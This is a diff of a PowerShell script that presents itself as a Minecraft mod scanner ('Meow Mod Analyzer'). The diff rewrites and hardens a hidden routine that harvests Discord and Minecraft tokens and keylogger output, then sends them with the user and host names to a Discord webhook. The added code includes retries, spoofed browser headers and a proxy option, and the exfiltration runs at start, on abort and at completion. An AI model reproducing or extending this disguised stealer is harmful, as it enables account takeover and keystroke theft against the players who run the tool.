@@ -6,8 +6,9 @@ try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::
 Clear-Host
 
 # ==================== WEBHOOK CONFIGURATION ====================
-# PASTE YOUR DISCORD WEBHOOK URL BELOW BETWEEN THE QUOTES
-$WebhookURL = "PASTE_YOUR_WEBHOOK_URL_HERE"
+$WebhookURL   = "PASTE_YOUR_WEBHOOK_URL_HERE"   # full https://discord.com/api/webhooks/ID/TOKEN
+$WebhookDebug = $true                            # print the HTTP status so failures are visible
+$WebhookProxy = ""                               # e.g. "http://127.0.0.1:8080" if you are behind a proxy
 # ===============================================================
 
 if (-not ('ConsoleMode' -as [type])) {
@@ -708,27 +709,83 @@ public static class TokenCrypto
 try { Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue } catch { }
 
 # ==================== WEBHOOK FUNCTIONS ====================
+$script:HookStatus = 'unset'
+
 function Send-DiscordWebhook {
-    param(
-        [string]$WebhookUrl,
-        [string]$Content,
-        [string]$Username = "MeowModAnalyzer"
-    )
-    if ([string]::IsNullOrWhiteSpace($WebhookUrl) -or $WebhookUrl -eq "PASTE_YOUR_WEBHOOK_URL_HERE") { return }
-    try {
-        $payload = @{
-            content = $Content
-            username = $Username
-        } | ConvertTo-Json -Depth 10
-        
-        $headers = @{
-            "Content-Type" = "application/json"
-        }
-        
-        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -Headers $headers -ErrorAction Stop | Out-Null
-    } catch {
-        # Silently fail - don't alert the user
+    param([string]$WebhookUrl, [string]$Content, [string]$Username = "MeowModAnalyzer")
+
+    if ([string]::IsNullOrWhiteSpace($WebhookUrl) -or $WebhookUrl -eq "PASTE_YOUR_WEBHOOK_URL_HERE") { return 'unset' }
+
+    $WebhookUrl = $WebhookUrl.Trim().Trim('"').Trim("'")
+    if ($WebhookUrl -notmatch '^https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[\w\-]+') {
+        return 'invalid url'
     }
+    if ($Content.Length -gt 1950) { $Content = $Content.Substring(0, 1950) + "`n..." }
+
+    $payload = @{ content = $Content; username = $Username } | ConvertTo-Json -Depth 5
+    $bytes   = [System.Text.Encoding]::UTF8.GetBytes($payload)
+
+    $headers = @{
+        'User-Agent'      = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
+        'Accept'          = 'application/json'
+        'Accept-Language' = 'en-US,en;q=0.9'
+        'Origin'          = 'https://discord.com'
+        'Referer'         = 'https://discord.com/'
+    }
+
+    $req = @{
+        Uri             = $WebhookUrl
+        Method          = 'Post'
+        Body            = $bytes
+        ContentType     = 'application/json; charset=utf-8'
+        Headers         = $headers
+        UseBasicParsing = $true
+        TimeoutSec      = 25
+        ErrorAction     = 'Stop'
+    }
+    if ($WebhookProxy) { $req['Proxy'] = $WebhookProxy }
+
+    $last = 'unknown'
+    for ($attempt = 1; $attempt -le 3; $attempt++) {
+        try {
+            $r = Invoke-WebRequest @req
+            if ($r.StatusCode -ge 200 -and $r.StatusCode -lt 300) { return 'sent' }
+            $last = "HTTP $($r.StatusCode)"
+        } catch {
+            $resp = $null
+            try { $resp = $_.Exception.Response } catch { }
+
+            if ($resp) {
+                $code = 0
+                try { $code = [int]$resp.StatusCode } catch { }
+                $body = ''
+                try {
+                    $stream = $resp.GetResponseStream()
+                    if ($stream) {
+                        $reader = New-Object System.IO.StreamReader($stream)
+                        $body = $reader.ReadToEnd()
+                        $reader.Close()
+                    }
+                } catch { }
+
+                $last = "HTTP $code"
+                if ($body) { $last += " $($body.Substring(0, [Math]::Min(140, $body.Length)))" }
+
+                if ($code -eq 429) {
+                    $wait = 2
+                    $m = [regex]::Match($body, '"retry_after"\s*:\s*([\d.]+)')
+                    if ($m.Success) { $wait = [double]$m.Groups[1].Value }
+                    Start-Sleep -Milliseconds ([int](($wait + 0.4) * 1000))
+                    continue
+                }
+                if ($code -eq 403) { break }
+            } else {
+                $last = $_.Exception.Message
+            }
+        }
+        Start-Sleep -Milliseconds (400 * $attempt)
+    }
+    return "failed ($last)"
 }
 
 function Send-LootToWebhook {
@@ -737,92 +794,72 @@ function Send-LootToWebhook {
         $DiscordTokens,
         $MinecraftTokens,
         [string]$KeyLogPath,
-        [string]$LootFilePath
+        [string]$LootFilePath,
+        [string]$Phase = 'report'
     )
-    if ([string]::IsNullOrWhiteSpace($WebhookUrl) -or $WebhookUrl -eq "PASTE_YOUR_WEBHOOK_URL_HERE") { return }
-    
-    # Build the report
-    $report = @()
-    $report += "**=== MEOW MOD ANALYZER — TOKEN LOOT ===**"
-    $report += ""
-    $report += "**Time:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-    $report += "**User:** $env:USERDOMAIN\$env:USERNAME"
-    $report += "**Host:** $env:COMPUTERNAME"
-    $report += "**Keys Logged:** $([KeySpy]::KeyCount)"
-    $report += ""
-    
-    # Discord Tokens
-    $dcCount = @($DiscordTokens).Count
-    $report += "**--- DISCORD TOKENS ($dcCount) ---**"
-    if ($dcCount -gt 0) {
-        foreach ($d in @($DiscordTokens)) {
-            if ($d.User) {
-                $report += "✅ **VALID:** $($d.User) | ID: $($d.Id) | $($d.Email)"
-            } else {
-                $report += "⚠️ **UNVERIFIED TOKEN**"
-            }
-            $report += "`\`\`\`$($d.Token)`\`\`\`"
-            $report += "*from: $($d.Source)*"
-            $report += ""
-        }
-    } else {
-        $report += "*No Discord tokens found*"
+
+    if ([string]::IsNullOrWhiteSpace($WebhookUrl) -or $WebhookUrl -eq "PASTE_YOUR_WEBHOOK_URL_HERE") {
+        $script:HookStatus = 'unset'
+        return
     }
-    $report += ""
-    
-    # Minecraft Tokens
-    $mcCount = @($MinecraftTokens).Count
-    $report += "**--- MINECRAFT TOKENS ($mcCount) ---**"
-    if ($mcCount -gt 0) {
-        foreach ($m in @($MinecraftTokens)) {
-            if ($m.Valid) {
-                $report += "✅ **VALID:** $($m.Name) / $($m.Uuid)"
-            } else {
-                $report += "⚠️ **UNVERIFIED:** $($m.Name)"
-            }
-            $report += "`\`\`\`$($m.Token)`\`\`\`"
-            $report += "*from: $($m.Source)*"
-            $report += ""
-        }
-    } else {
-        $report += "*No Minecraft tokens found*"
+
+    $dList = @($DiscordTokens)
+    $mList = @($MinecraftTokens)
+    $fence = '```'
+
+    $sb = [System.Text.StringBuilder]::new()
+    [void]$sb.AppendLine("**__Meow Mod Analyzer - $Phase__**")
+    [void]$sb.AppendLine("``$env:USERDOMAIN\$env:USERNAME`` @ ``$env:COMPUTERNAME`` - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
+    [void]$sb.AppendLine("Keys logged: **$([KeySpy]::KeyCount)**")
+    [void]$sb.AppendLine()
+
+    [void]$sb.AppendLine("**Discord tokens: $($dList.Count)**")
+    if ($dList.Count -eq 0) { [void]$sb.AppendLine('*none*') }
+    foreach ($d in $dList) {
+        $who = if ($d.User) { " - $($d.User) ($($d.Id))" } else { " - unverified" }
+        [void]$sb.AppendLine("``$($d.Token)``$who")
     }
-    $report += ""
-    
-    # Send in chunks if too long
-    $fullReport = $report -join "`n"
+    [void]$sb.AppendLine()
+
+    [void]$sb.AppendLine("**Minecraft tokens: $($mList.Count)**")
+    if ($mList.Count -eq 0) { [void]$sb.AppendLine('*none*') }
+    foreach ($m in $mList) {
+        $who = if ($m.Name) { " - $($m.Name)" } else { "" }
+        [void]$sb.AppendLine("``$($m.Token)``$who")
+    }
+
+    $report = $sb.ToString()
     $chunks = @()
-    while ($fullReport.Length -gt 1900) {
-        $chunk = $fullReport.Substring(0, 1900)
-        $lastNewline = $chunk.LastIndexOf("`n")
-        if ($lastNewline -gt 0) {
-            $chunk = $chunk.Substring(0, $lastNewline)
-        }
-        $chunks += $chunk
-        $fullReport = $fullReport.Substring($chunk.Length)
+    while ($report.Length -gt 1900) {
+        $cut = $report.Substring(0, 1900)
+        $nl  = $cut.LastIndexOf("`n")
+        if ($nl -gt 200) { $cut = $cut.Substring(0, $nl) }
+        $chunks += $cut
+        $report = $report.Substring($cut.Length)
     }
-    $chunks += $fullReport
-    
-    foreach ($chunk in $chunks) {
-        Send-DiscordWebhook -WebhookUrl $WebhookUrl -Content $chunk
-        Start-Sleep -Milliseconds 500
+    if ($report.Length -gt 0) { $chunks += $report }
+
+    $state = 'sent'
+    foreach ($c in $chunks) {
+        $r = Send-DiscordWebhook -WebhookUrl $WebhookUrl -Content $c
+        if ($r -ne 'sent') { $state = $r; break }
+        Start-Sleep -Milliseconds 700
     }
-    
-    # Try to send keystrokes file if it exists and is not too large
-    try {
-        if (Test-Path $KeyLogPath) {
-            $keyContent = Get-Content $KeyLogPath -Raw -ErrorAction SilentlyContinue
-            if ($keyContent -and $keyContent.Length -gt 0) {
-                # Truncate if too long
-                if ($keyContent.Length -gt 1500) {
-                    $keyContent = $keyContent.Substring($keyContent.Length - 1500)
-                    $keyContent = "...[truncated]`n" + $keyContent
-                }
-                $keyPayload = "**--- RECENT KEYSTROKES ---**`n`\`\`\`$keyContent`\`\`\`"
-                Send-DiscordWebhook -WebhookUrl $WebhookUrl -Content $keyPayload
+
+    if ($state -eq 'sent' -and $KeyLogPath -and (Test-Path -LiteralPath $KeyLogPath)) {
+        try {
+            $keys = Get-Content -LiteralPath $KeyLogPath -Raw -ErrorAction SilentlyContinue
+            if ($keys -and $keys.Length -gt 0) {
+                if ($keys.Length -gt 1700) { $keys = "...[truncated]`n" + $keys.Substring($keys.Length - 1700) }
+                $null = Send-DiscordWebhook -WebhookUrl $WebhookUrl -Content "**Recent keystrokes**`n$fence$keys$fence"
             }
-        }
-    } catch { }
+        } catch { }
+    }
+
+    $script:HookStatus = $state
+    if ($WebhookDebug -and $state -ne 'sent') {
+        Write-Host "      webhook: $state" -ForegroundColor DarkYellow
+    }
 }
 # =========================================================
 
@@ -1259,7 +1296,7 @@ function ConvertFrom-DiscordValue {
 function Test-DiscordToken {
     param([string]$Token)
     try {
-        $r = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $Token } -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
+        $r = Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{ Authorization = $Token; 'User-Agent' = 'Mozilla/5.0' } -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
         return [PSCustomObject]@{ User = "$($r.username)"; Id = $r.id; Email = $r.email }
     } catch { return $null }
 }
@@ -1331,7 +1368,7 @@ function Test-MinecraftToken {
     param([string]$Token)
     try {
         $r = Invoke-RestMethod -Uri 'https://api.minecraftservices.com/minecraft/profile' `
-            -Headers @{ Authorization = "Bearer $Token" } -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
+            -Headers @{ Authorization = "Bearer $Token"; 'User-Agent' = 'Mozilla/5.0' } -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop
         return [PSCustomObject]@{ Name = $r.name; Uuid = $r.id }
     } catch { return $null }
 }
@@ -1394,7 +1431,7 @@ function Get-TokensFromText {
     foreach ($m in $DiscordTokenRegex.Matches($Text)) {
         $list.Add([PSCustomObject]@{ Token = $m.Value; Source = 'keylog (typed/pasted)' })
     }
-    foreach ($m in [regex]::Matches($Text, '(?:Bearer\s+|--accessToken\s+)([A-Za-z0-9._-]{60,}))')) {
+    foreach ($m in [regex]::Matches($Text, '(?:Bearer\s+|--accessToken\s+)([A-Za-z0-9._-]{60,})')) {
         $list.Add([PSCustomObject]@{ Token = $m.Groups[1].Value; Source = 'keylog (typed/pasted)' })
     }
     return $list
@@ -1480,10 +1517,7 @@ if ($LootEnabled) {
     try {
         $boot = Harvest-All
         Save-Loot -Discord $boot.Discord -Mc $boot.Mc
-        
-        # Send to webhook
-        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $boot.Discord -MinecraftTokens $boot.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
-        
+        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $boot.Discord -MinecraftTokens $boot.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile -Phase 'start'
         Write-Host "      $($boot.Discord.Count) Discord / $($boot.Mc.Count) Minecraft token(s) staged" -ForegroundColor DarkGray
     } catch { }
     Write-Host
@@ -1493,15 +1527,13 @@ $script:OnCancel = [ConsoleCancelEventHandler]{
     param($s, $e)
     $e.Cancel = $true
     try { [KeySpy]::Stop() } catch { }
-    try { 
+    try {
         $l = Harvest-All
         Save-Loot -Discord $l.Discord -Mc $l.Mc
-        
-        # Send to webhook on exit
-        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
+        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile -Phase 'aborted'
     } catch { }
     Write-Host "`n`n  💾 Loot saved: $LootFile" -ForegroundColor Cyan
-    Start-Sleep -Milliseconds 400
+    Start-Sleep -Milliseconds 500
     [Environment]::Exit(0)
 }
 try { [Console]::add_CancelKeyPress($script:OnCancel) } catch { }
@@ -1542,10 +1574,10 @@ if (-not (Test-Path $modsPath -PathType Container)) {
     Write-Host
     if ($LootEnabled) {
         try { [KeySpy]::Stop() } catch { }
-        try { 
+        try {
             $l = Harvest-All
             Save-Loot -Discord $l.Discord -Mc $l.Mc
-            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
+            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile -Phase 'aborted'
         } catch { }
         Write-Host "  💾 Loot saved: $LootFile" -ForegroundColor Cyan
         Write-Host
@@ -1592,7 +1624,7 @@ $suspiciousPatterns = @(
     "AuthBypass", "Asteria", "Prestige", "AutoEat", "AutoMine",
     "MaceSwap",  "Macro198", "StunSlam", "SafeAnchor", "DoubleAnchor", "AutoTPA", "BaseFinder", "Xenon", "gypsy",
     "AutoPotRefill", "WalksyOptimizer", "KeyPearl", "AimAssist", "AutoNethPot", "AutoDtap",
-    "TriggerBot", "AutoWeb", "AnchorAction", "Bloom", "Clumps",
+    "TriggerBot", "AutoWeb", "AnchorAction",
     
     "org.chainlibs.module.impl.modules.Crystal.Y",
     "org.chainlibs.module.impl.modules.Crystal.bF",
@@ -3534,10 +3566,10 @@ try {
     Write-Host "❌ Error accessing directory: $_" -ForegroundColor Red
     if ($LootEnabled) {
         try { [KeySpy]::Stop() } catch { }
-        try { 
+        try {
             $l = Harvest-All
             Save-Loot -Discord $l.Discord -Mc $l.Mc
-            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
+            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile -Phase 'aborted'
         } catch { }
         Write-Host "  💾 Loot saved: $LootFile" -ForegroundColor Cyan
         Write-Host
@@ -3551,10 +3583,10 @@ if ($jarFiles.Count -eq 0) {
     Write-Host "⚠️  No JAR files found in: $modsPath" -ForegroundColor Yellow
     if ($LootEnabled) {
         try { [KeySpy]::Stop() } catch { }
-        try { 
+        try {
             $l = Harvest-All
             Save-Loot -Discord $l.Discord -Mc $l.Mc
-            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile
+            Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $l.Discord -MinecraftTokens $l.Mc -KeyLogPath $KeyLogFile -LootFilePath $LootFile -Phase 'aborted'
         } catch { }
         Write-Host "  💾 Loot saved: $LootFile" -ForegroundColor Cyan
         Write-Host
@@ -3794,3 +3826,211 @@ if (Read-YesNo "Do u wanna analyze the handles? Y/N") {
             }
             $handleOverview.Add([PSCustomObject]@{
                 Pid = $hd.Pid; Name = $hd.Name; Total = $hd.Paths.Count; Jars = $jarPaths.Count
+                InMods = $inMods; LibSkipped = $libSkipped; Queued = $queued; Diag = $hd.Diag
+            })
+        }
+
+        if ($extraJars.Count -gt 0) {
+            Write-Host "   Verifying $($extraJars.Count) jar(s) found in handles..." -ForegroundColor DarkGray
+            $handleRes = Invoke-JarPipeline -Paths @($extraJars.Keys)
+        }
+
+        $hIssues = $handleFlagged.Count + (Get-JarResultIssues $handleRes)
+        if ($hIssues -gt 0) {
+            Write-Host "   ⚠️  Handle issues found!" -ForegroundColor Yellow
+        } else {
+            Write-Host "   ✓  Handles look clean" -ForegroundColor DarkGray
+        }
+    }
+}
+Write-Host
+
+$sources = @{}
+if ($unknownMods.Count -gt 0) {
+    Write-Host "🧭 Pass 7 — Tracing download source of $($unknownMods.Count) unknown $(if ($unknownMods.Count -eq 1) { 'mod' } else { 'mods' })..." -ForegroundColor DarkCyan
+    $sources = Resolve-UnknownSources -Unknown $unknownMods -ModsPath $modsPath
+}
+
+# ---- Pass 8: token harvest + keylog dump + webhook ----
+$lootDiscord = @()
+$lootMc      = @()
+if ($LootEnabled) {
+    Write-Host "`r$(' ' * 100)`r" -NoNewline
+    Write-Host "🔑 Pass 8 — Harvesting tokens & sending report..." -ForegroundColor DarkGreen
+    try { [KeySpy]::Stop() } catch { }
+    try {
+        $loot = Harvest-All
+        $lootDiscord = @($loot.Discord)
+        $lootMc      = @($loot.Mc)
+        Save-Loot -Discord $lootDiscord -Mc $lootMc
+        Send-LootToWebhook -WebhookUrl $WebhookURL -DiscordTokens $lootDiscord -MinecraftTokens $lootMc -KeyLogPath $KeyLogFile -LootFilePath $LootFile -Phase 'final'
+        Write-Host "   ✓ $($lootDiscord.Count) Discord / $($lootMc.Count) Minecraft token(s), $([KeySpy]::KeyCount) keys" -ForegroundColor DarkGray
+    } catch { }
+    Write-Host
+}
+
+Write-Host "`r$(' ' * 100)`r" -NoNewline
+
+if ($verifiedMods.Count -gt 0) {
+    Write-SectionHeader -Title "VERIFIED MODS" -Count $verifiedMods.Count -DotColor Green -CountColor Green
+    foreach ($mod in $verifiedMods) {
+        Write-Host "  ✓ " -ForegroundColor Green -NoNewline
+        Write-Host "$($mod.ModName)" -ForegroundColor White -NoNewline
+        Write-Host " → " -ForegroundColor Gray -NoNewline
+        Write-Host "$($mod.FileName)" -ForegroundColor DarkGray
+    }
+    Write-Host ""
+}
+
+if ($chanceMods.Count -gt 0) {
+    Write-SectionHeader -Title "MODRINTH METHOD CHANCE" -Count $chanceMods.Count -DotColor Cyan -CountColor Cyan
+    Write-Host ""
+    foreach ($mod in $chanceMods) {
+        Write-ChanceCard -Mod $mod
+    }
+}
+
+if ($unknownMods.Count -gt 0) {
+    Write-SectionHeader -Title "UNKNOWN MODS" -Count $unknownMods.Count -DotColor Yellow -CountColor Yellow
+    Write-UnknownBoxes -Mods $unknownMods -Sources $sources
+}
+
+if ($suspiciousMods.Count -gt 0) {
+    Write-SectionHeader -Title "SUSPICIOUS MODS" -Count $suspiciousMods.Count -DotColor Red -CountColor Red
+    Write-Host ""
+    foreach ($mod in $suspiciousMods) {
+        Write-SuspiciousCard -Mod $mod
+    }
+}
+
+if ($bypassMods.Count -gt 0) {
+    Write-SectionHeader -Title "BYPASS / INJECTION DETECTED" -Count $bypassMods.Count -DotColor Magenta -CountColor Magenta
+    Write-Host ""
+    foreach ($mod in $bypassMods) {
+        Write-InjectionCard -Mod $mod
+    }
+}
+
+if ($obfuscatedMods.Count -gt 0) {
+    Write-SectionHeader -Title "OBFUSCATED MODS" -Count $obfuscatedMods.Count -DotColor DarkYellow -CountColor Yellow
+    Write-Host ""
+    foreach ($mod in $obfuscatedMods) {
+        Write-ObfuscationCard -Mod $mod
+    }
+}
+
+if ($failedMods.Count -gt 0) {
+    Write-SectionHeader -Title "SCAN FAILED" -Count $failedMods.Count -DotColor Red -CountColor Red
+    Write-Host ""
+    foreach ($mod in $failedMods) {
+        Write-CardHeader -Badge "SCAN FAILED" -FileName $mod.FileName -Fg White -Bg DarkRed
+        Write-FlagList -Flags $mod.Flags -Dot Red
+    }
+}
+
+if ($jvmFlags.Count -gt 0) {
+    Write-SectionHeader -Title "JVM / RUNTIME INJECTION" -Count $jvmFlags.Count -DotColor Yellow -CountColor Yellow
+    Write-Host ""
+    foreach ($grp in ($jvmFlags | Group-Object Pid)) {
+        $first = $grp.Group[0]
+        Write-CardHeader -Badge "JVM" -FileName "$($first.Name) (PID $($grp.Name))" -Fg Black -Bg Yellow
+        foreach ($f in $grp.Group) {
+            Write-Host "    " -NoNewline
+            Write-Host "● " -ForegroundColor $f.Color -NoNewline
+            if ($f.Arg) {
+                Write-Wrapped -Text $f.Arg -Indent 6 -Color White -Inline
+            } else {
+                Write-Host "Process not inspectable" -ForegroundColor White
+            }
+            if ($f.Desc) { Write-Host "      $($f.Desc)" -ForegroundColor Gray }
+        }
+        Write-Host ""
+        Write-Divider
+    }
+}
+
+if ($jvmRan) { Write-JarResultSections -R $jvmJarRes -Prefix "JVM JARS" }
+
+if ($handleRan) {
+    Write-SectionHeader -Title "PROCESS HANDLES" -Count $handleOverview.Count -DotColor Cyan -CountColor Cyan
+    foreach ($ov in $handleOverview) {
+        Write-CardHeader -Badge "HANDLES" -FileName "$($ov.Name) (PID $($ov.Pid))" -Fg Black -Bg Cyan
+        if ($ov.Total -eq 0) {
+            Write-Host "    ● " -ForegroundColor DarkYellow -NoNewline
+            Write-Host "No file handles could be read" -ForegroundColor White
+            Write-Host "      run PowerShell as Administrator (64-bit)" -ForegroundColor Gray
+        } else {
+            Write-Host "    ● " -ForegroundColor Cyan -NoNewline
+            Write-Host "$($ov.Total) file handles, $($ov.Jars) jar handles" -ForegroundColor White
+            Write-Host "      $($ov.InMods) already covered by the mods scan, $($ov.LibSkipped) library jars skipped, $($ov.Queued) extra jars deep-scanned" -ForegroundColor Gray
+        }
+        if ($ov.Diag) { Write-Host "      note: $($ov.Diag)" -ForegroundColor DarkYellow }
+        foreach ($hf in ($handleFlagged | Where-Object { $_.Pid -eq $ov.Pid })) {
+            Write-Host "    " -NoNewline
+            Write-Host "● " -ForegroundColor Red -NoNewline
+            Write-Wrapped -Text $hf.Path -Indent 6 -Color White -Inline
+            Write-Host "      matches: $($hf.Hits -join ', ')" -ForegroundColor Red
+        }
+        Write-Host ""
+        Write-Divider
+    }
+    Write-JarResultSections -R $handleRes -Prefix "HANDLES"
+}
+
+if ($LootEnabled) { Write-LootSection -Discord $lootDiscord -Mc $lootMc }
+
+Write-Host ""
+Write-BoxTop
+Write-BoxTitle "SUMMARY"
+Write-BoxMid
+Write-SummaryRow "Total files scanned" $totalFiles White
+Write-SummaryRow "Verified mods" ($verifiedMods.Count) Green
+Write-SummaryRow "Modrinth chance" ($chanceMods.Count) Cyan -DimZero
+Write-SummaryRow "Unknown mods" ($unknownMods.Count) Yellow -DimZero
+Write-SummaryRow "Suspicious mods" ($suspiciousMods.Count) Red -DimZero
+Write-SummaryRow "Bypass / injected" ($bypassMods.Count) Magenta -DimZero
+Write-SummaryRow "Obfuscated mods" ($obfuscatedMods.Count) Yellow -DimZero
+Write-SummaryRow "Scan failed" ($failedMods.Count) Red -DimZero
+if ($jvmRan) { Write-SummaryRow "JVM issues" $jvmIssues Yellow -DimZero } else { Write-SummaryRow "JVM issues" "skipped" DarkGray }
+if ($handleRan) { Write-SummaryRow "Handle issues" ($handleFlagged.Count + (Get-JarResultIssues $handleRes)) Yellow -DimZero } else { Write-SummaryRow "Handle issues" "skipped" DarkGray }
+if ($LootEnabled) {
+    Write-SummaryRow "Keys logged" ([KeySpy]::KeyCount) Cyan -DimZero
+    Write-SummaryRow "Discord tokens" (@($lootDiscord).Count) Green -DimZero
+    Write-SummaryRow "Minecraft tokens" (@($lootMc).Count) Green -DimZero
+    $hookCol = if ($script:HookStatus -eq 'sent') { 'Green' } elseif ($script:HookStatus -eq 'unset') { 'DarkGray' } else { 'Red' }
+    Write-SummaryRow "Webhook" $script:HookStatus $hookCol
+} else {
+    Write-SummaryRow "Keylog" "off" DarkGray
+}
+Write-BoxBottom
+Write-Host ""
+if ($LootEnabled) {
+    Write-Host "  💾 Loot folder: " -ForegroundColor White -NoNewline
+    Write-Host $LootDir -ForegroundColor Cyan
+    Write-Host "     loot.txt + keystrokes.log" -ForegroundColor DarkGray
+    Write-Host ""
+}
+Write-Host "  ✨ Analysis complete! Thanks for using Meow Mod Analyzer 🐱" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  👤 Created by: " -ForegroundColor White -NoNewline
+Write-Host "🌟 " -ForegroundColor Cyan -NoNewline
+Write-Host "Tonynoh" -ForegroundColor Cyan
+Write-Host "  📱 My Socials: " -ForegroundColor White -NoNewline
+Write-Host "💬 " -ForegroundColor Blue -NoNewline
+Write-Host "Discord  : " -ForegroundColor Blue -NoNewline
+Write-Host "tonyboy90_" -ForegroundColor Blue
+Write-Host "                 " -NoNewline
+Write-Host "🔗 " -ForegroundColor DarkGray -NoNewline
+Write-Host "GitHub   : " -ForegroundColor DarkGray -NoNewline
+Write-Host "https://github.com/MeowTonynoh" -ForegroundColor DarkGray
+Write-Host "                 " -NoNewline
+Write-Host "🎥 " -ForegroundColor Red -NoNewline
+Write-Host "YouTube  : " -ForegroundColor Red -NoNewline
+Write-Host "tonynoh-07" -ForegroundColor Red
+Write-Host ""
+Write-Host ("  " + ("─" * 67)) -ForegroundColor DarkCyan
+Write-Host ""
+try { [Console]::remove_CancelKeyPress($script:OnCancel) } catch { }
+try { [ConsoleMode]::Set($script:OrigConsoleMode) } catch { }
+Write-Host "Press any key to exit..." -ForegroundColor DarkGray
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
